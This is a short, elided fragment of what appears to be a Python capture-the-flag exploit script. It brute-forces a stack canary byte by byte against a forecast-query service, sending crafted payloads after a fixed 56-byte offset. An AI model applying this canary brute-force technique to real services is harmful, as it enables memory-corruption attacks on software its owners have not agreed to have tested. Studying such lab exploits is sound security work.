...
OFFSET_TO_CANARY = 56   # 48 bytes for the buffer + 8 bytes for alignment
...
for i in range(7):
    for bval in range(256):
        ...
        io.recvuntil(b"Enter your location: ")
        io.sendline(b"A"*10)  # send some input for the first prompt (not relevant for the exploit)

        io.recvuntil(b"Submit your forecast query: ")
        io.send(payload)
        try:
